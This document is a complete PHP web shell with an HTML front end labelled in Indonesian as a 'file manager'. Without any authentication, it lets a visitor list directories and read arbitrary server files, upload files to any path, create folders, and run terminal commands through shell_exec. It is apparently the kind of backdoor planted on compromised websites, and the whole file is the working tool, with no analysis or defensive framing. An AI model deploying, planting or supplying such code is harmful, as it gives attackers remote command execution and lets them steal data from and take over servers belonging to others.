<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Pengelola Berkas</title>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            background: url('https://gcdnb.pbrd.co/images/9MsvMtxPndIa.jpg') no-repeat center center fixed;
            background-size: cover;
            color: white;
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }
        #container {
            border: 0px solid darkred;
            padding: 50px;
            border-radius: 10px;
            background-color: rgba(0, 0, 0, 0.7);
            width: 100vw;
            height: 100vh;
            box-sizing: border-box;
            overflow: auto;
            display: flex;
            flex-direction: column;
            align-items: center;
            justify-content: center;
        }
        .icon-button {
            font-size: 25px;
            color: white;
            cursor: pointer;
            background-color: darkred;
            border-radius: 50%;
            padding: 10px;
            margin: 5px;
            display: inline-flex;
            align-items: center;
            justify-content: center;
        }
        input[type="text"], textarea {
            border: 2px solid darkred;
            background-color: black;
            color: white;
            padding: 10px;
            width: 100%;
            border-radius: 5px;
            box-sizing: border-box;
        }
        textarea {
            resize: vertical;
            min-height: 100px;
            margin-bottom: 10px;
        }
        form {
            margin-bottom: 20px;
        }
        pre {
            background-color: #333;
            padding: 10px;
            border-radius: 5px;
            width: 100%;
            box-sizing: border-box;
        }
        .form-container {
            display: none;
            width: 100%;
            margin-top: 10px;
        }
        .submit-button {
            background-color: darkred;
            border: none;
            color: white;
            padding: 10px 20px;
            border-radius: 5px;
            cursor: pointer;
            display: inline-flex;
            align-items: center;
        }
        .submit-button i {
            margin-right: 8px;
        }
        img {
        display: block;
        margin: 0 auto 20px; 
        width: 150px;
        height: 150px;
        border-radius: 50%;
        border: 2px solid darkred;
        object-fit: cover;
        }
    </style>
</head>
<body>
    <div id="container">
        <img src="https://media.tenor.com/TcwzV1IM0EcAAAAi/zero-two-ok.gif" alt="Logo">
        <b>Pengelola Berkas</b><br />
        <form method="GET" action="">
            <input type="text" id="path" name="path" size="150" value="<?php if (isset($_GET['path'])) { echo htmlspecialchars($_GET['path']); } ?>" /><p>
            <center><button type="submit" class="submit-button"><i class="fas fa-search"></i> Cari</button></center>
        </form>
        <center>
            <i class="fas fa-upload icon-button" onclick="toggleForm('upload-form')"></i>
            <i class="fas fa-folder-plus icon-button" onclick="toggleForm('create-folder-form')"></i>
            <i class="fas fa-terminal icon-button" onclick="toggleForm('run-command-form')"></i>
        </center>

        <div id="upload-form" class="form-container">
            <form method="POST" action="" enctype="multipart/form-data">
                <input type="hidden" name="upload_path" value="<?php if (isset($_GET['path'])) { echo htmlspecialchars($_GET['path']); } ?>" />
                <input type="file" name="uploaded_file" />
                <button type="submit" name="upload" class="submit-button"><i class="fas fa-upload"></i> Unggah</button>
            </form>
        </div>

        <div id="create-folder-form" class="form-container">
            <form method="POST" action="">
                <input type="hidden" name="create_path" value="<?php if (isset($_GET['path'])) { echo htmlspecialchars($_GET['path']); } ?>" />
                <input type="text" name="folder_name" size="50" placeholder="Nama Folder" /><p>
                <button type="submit" name="create_folder" class="submit-button"><i class="fas fa-folder-plus"></i> Buat Folder</button>
            </form>
        </div>

        <div id="run-command-form" class="form-container">
            <form method="POST" action="">
                <input type="text" name="command" size="50" placeholder="Masukkan perintah terminal" /><p>
                <button type="submit" name="run_command" class="submit-button"><i class="fas fa-terminal"></i> Perintah</button>
            </form>
        </div>

        <pre>
        <?php
        if (isset($_GET['path'])) {
            $path = $_GET['path'] == '' ? './' : $_GET['path'];
            if (is_dir($path)) {
                echo '<br />';
                foreach (scandir($path) as $data) {
                    if ($data !== '.' && $data !== '..') {
                        $fullPath = rtrim($path, '/') . '/' . $data;
                        echo "<a href='?path=" . urlencode($fullPath) . "'>$data</a><br />";
                    }
                }
            } else {
                echo 'File <br />';
                echo htmlspecialchars(file_get_contents($path));
            }
        }

        // Menangani unggahan file
        if (isset($_POST['upload'])) {
            $upload_path = $_POST['upload_path'];
            if (isset($_FILES['uploaded_file']) && $_FILES['uploaded_file']['error'] === UPLOAD_ERR_OK) {
                $tmp_name = $_FILES['uploaded_file']['tmp_name'];
                $name = basename($_FILES['uploaded_file']['name']);
                $target_file = rtrim($upload_path, '/') . '/' . $name;

                if (move_uploaded_file($tmp_name, $target_file)) {
                    echo '<b>Unggah Berhasil:</b> ' . htmlspecialchars($target_file) . '<br />';
                } else {
                    echo '<b>Unggah Gagal</b><br />';
                }
            } else {
                echo '<b>Tidak ada file yang diunggah atau terjadi kesalahan</b><br />';
            }
        }

        // Menangani eksekusi perintah terminal
        if (isset($_POST['run_command']) && !empty($_POST['command'])) {
            $command = escapeshellcmd($_POST['command']);
            $output = shell_exec($command);
            echo '<b>Output Perintah:</b><br />';
            echo htmlspecialchars($output);
        }

        // Menangani pembuatan folder
        if (isset($_POST['create_folder']) && !empty($_POST['folder_name'])) {
            $create_path = $_POST['create_path'];
            $folder_name = basename($_POST['folder_name']);
            $new_folder_path = rtrim($create_path, '/') . '/' . $folder_name;

            if (mkdir($new_folder_path, 0755)) {
                echo '<b>Folder Berhasil Dibuat:</b> ' . htmlspecialchars($new_folder_path) . '<br />';
            } else {
                echo '<b>Gagal Membuat Folder</b><br />';
            }
        }
        ?>
        </pre>
    </div>
    <script>
    function toggleForm(formId) {
        var form = document.getElementById(formId);
        form.style.display = (form.style.display === 'none' || form.style.display === '') ? 'block' : 'none';
    }

    document.addEventListener('DOMContentLoaded', function() {
        var currentPath = "<?php echo htmlspecialchars(__FILE__); ?>";
        document.getElementById('path').value = currentPath;
    });
    </script>
</body>
</html>
